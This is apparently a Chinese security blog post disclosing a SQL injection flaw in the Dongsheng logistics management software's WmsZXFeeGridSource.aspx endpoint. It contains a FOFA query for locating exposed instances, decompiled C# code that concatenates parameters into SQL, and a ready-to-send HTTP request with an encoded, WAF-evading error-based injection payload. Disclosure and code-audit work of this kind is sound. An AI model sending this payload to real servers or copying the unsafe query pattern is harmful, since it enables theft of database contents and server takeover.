---
title: "东胜物流软件 WmsZXFeeGridSource.aspx SQL注入漏洞"
source: https://mrxn.net/jswz/dongsheng-WmsZXFeeGridSource-sqli.html
asset_dir: assets/东胜物流软件-wmszxfeegridsource.aspx-sql注入漏洞
---

# 东胜物流软件 WmsZXFeeGridSource.aspx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/7/16 12:37
- 1037浏览
- [0评论](#comment)
- 45分钟阅读

深入探索

服务器

软件

身份验证

---

# 漏洞简介

东胜物流[软件](#)是青岛东胜伟业软件有限公司一款集订单管理、仓库管理、运输管理等多种功能于一体的物流管理软件。东胜物流信息管理系统 WmsZXFeeGridSource.aspx 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

物流软件安全

# 影响版本

# fofa语法

> body="FeeCodes/CompanysAdapter.aspx" || body="dhtmlxcombo\_whp.js" || body="dongshengsoft" || body="theme/dhtmlxcombo.css"

# 漏洞分析

深入探索

Docker加速服务

传输层安全性协议

漏洞修复方案

根据 WmsZXFeeGridSource.aspx 的代码引用 DSWeb.WMS\_ZX.WmsZXFeeGridSource ，在dll中找到它的逻辑实现

[![东胜物流软件 WmsZXFeeGridSource.aspx SQL注入漏洞](images/img-001-7d0b27dcaa2b.webp)](https://image.mrxn.net/d35380710f2d4b30b2d89a81550cc0e6.webp)

主要就是根据read参数的值来进行处理不同的分支逻辑

SQL注入检测工具

深入探索

网络安全课程

恶意软件分析工具

网络安全会议

[![东胜物流软件 WmsZXFeeGridSource.aspx SQL注入漏洞](images/img-002-ac7cdc76e9bf.webp)](https://image.mrxn.net/2a0fee06a5a54cdba1ed2988fe7a9a34.webp)

当read=areaname时，进入DoAreaname方法

代码安全审计

```
private string DoAreaname(string strClientValue)
{
  StringBuilder stringBuilder1 = new StringBuilder();
  StringBuilder stringBuilder2 = new StringBuilder();
  stringBuilder1.Append("{");
  stringBuilder1.Append("area:[");
  T_ALL_DA tAllDa = new T_ALL_DA();
  string str = "";
  if (string.op_Inequality(strClientValue.Trim(), ""))
    str = $" and STORAGENAME='{strClientValue}'";
  string strSQL = $"select * from wms_storage_area where 1=1 {str} and ISENABLE=1 order by AREANAME";
  DataSet allSql = tAllDa.GetAllSQL(strSQL);
```

strClientValue参数的值被直接拼接在strSQL语句里，然后用GetAllSQL进行执行，全程无过滤或校验，导致[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

其他几个分支也存在同样的SQL拼接导致的SQL注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)

```
this.strGIDS = this.Request.QueryString["gids"].ToString();
else if (this.strReadXmlType.Equals("areaname"))
  this.Response.Write(this.DoAreaname(this.strareaname));
else if (this.strReadXmlType.Equals("isout"))
  this.Response.Write(this.Doisout(this.strGIDS));
else if (this.strReadXmlType.Equals("getacreage"))
  this.Response.Write(this.getacreage(this.strareaname));
else if (this.strReadXmlType.Trim().ToLower().Equals("islock"))
  this.Response.Write(this.setislock());
else if (string.op_Equality(this.strReadXmlType, "notlock"))
  this.Response.Write(this.setnotlock());
else if (string.op_Equality(this.strReadXmlType, "getislock"))
  this.Response.Write(this.getislock());
else if (string.op_Equality(this.strReadXmlType, "setcopy"))

private string Doisout(string sGIDS)
{
  return new T_ALL_DA().GetStrSQL("num", $"select count(*) num from wms_out_detail where INBSNO in ('{sGIDS.Trim()}')");
}

private string GetCells(int iShowCount, string readXmlType)
{
string strSql = $" SELECT GID,CLIENTNAME,STORAGENAME,AREANAME,UNITPRICE,ACREAGE,ARFEE,UNIT,REMARK,ISLOCK FROM wms_fee WHERE 1=1 and FEEYEAR='{this.stryear.Trim()}' and FEEMONTH='{this.strmonth.Trim()}' ORDER BY MODIFIEDTIME desc";
}

private string setCopy()
{
  return new T_ALL_DA().GetExecuteSqlCommand($"insert into wms_fee select newid() as [GID],{this.stryear2} as [FEEYEAR],{this.strmonth2} as [FEEMONTH],[CLIENTNAME],[STORAGENAME],[AREANAME],[UNITPRICE],[ACREAGE],[ARFEE],[APFEE],[REMARK],0 as [ISLOCK],getdate() as [LOCKTIME],'' as [LOCKUSER],'{this.strUserID}' as [CREATEUSER],getdate() as [CREATETIME],'{this.strUserID}' as [MODIFIEDUSER],getdate() as [MODIFIEDTIME],[UNIT] from wms_fee where [FEEYEAR]={this.stryear1} and [FEEMONTH]={this.strmonth1}").ToString().Trim();
}

private string getislock()
{
  return new T_ALL_DA().GetStrSQL("nums", $"select count(gid) nums from wms_fee where ISLOCK=1 and gid in ({$"'{this.strGIDS.Replace(",", "','")}'"})");
}

private string setnotlock()
{
  string str = $"'{this.strGIDS.Replace(",", "','")}'";
  T_ALL_DA tAllDa = new T_ALL_DA();
  if (!string.op_Equality(tAllDa.GetStrSQL("nums", $"select count(gid) nums from ch_fee where (bsno in ({str}) or WMSOUTBSNO in ({str})) and (ISINVOICE=1 or AUDITSTATUS=1 or ORDERINVOICE<>0.00 or DEBITNO is not null or (FEESTATUS<>0 and FEESTATUS<>1))").Trim(), "0"))
    return "有“未申请开票、未开发票或未对帐”的入账数据，不允许取消入账，请重新操作！";
  if (!string.op_Equality(tAllDa.GetStrSQL("nums", $"select count(gid) nums from ch_fee_do where feeid in (select gid nums from ch_fee where (bsno in ({str}) or WMSOUTBSNO in ({str})))").Trim(), "0"))
    return "有“未申请开票、未开发票或未对帐”的入账数据，不允许取消入账，请重新操作！";
  return new WmsFeeDA().setnotlock(this.strGIDS, this.strUserID) < 0 ? "操作有误，请重新操作！" : "";
}
```

存在多个[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

> 由于参数会被自动去除多余的空格等，同时areaname参数还会进行反转义操作，因此可以对payload进行unicode编码或者16进制编码在url编码等等操作，从而可能绕过waf
>
> 漏洞预警服务

```
GET /WMS_ZX/WmsZXFeeGridSource.aspx?areaname=%20%20%20%20%5c%75%30%30%33%31%5c%75%30%30%32%37%5c%75%30%30%36%31%5c%75%30%30%36%65%5c%75%30%30%36%34%5c%75%30%30%32%30%5c%75%30%30%33%31%5c%75%30%30%33%63%5c%75%30%30%34%30%5c%75%30%30%34%30%5c%75%30%30%35%36%5c%75%30%30%34%35%5c%75%30%30%35%32%5c%75%30%30%35%33%5c%75%30%30%34%39%5c%75%30%30%34%66%5c%75%30%30%34%65%5c%75%30%30%32%64%5c%75%30%30%32%64%20%20%20%20&read=%20%20%20%20areaname%20%20%20%20 HTTP/1.1
Host: dongsheng.mrxn.net
```

[![东胜物流软件 WmsZXFeeGridSource.aspx SQL注入漏洞](images/img-003-ee4d48a4b60b.webp)](https://image.mrxn.net/44eea2d4c6464f69bf15caaf95040da0.webp)

通过报错注入在响应里回显数据库版本信息。

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
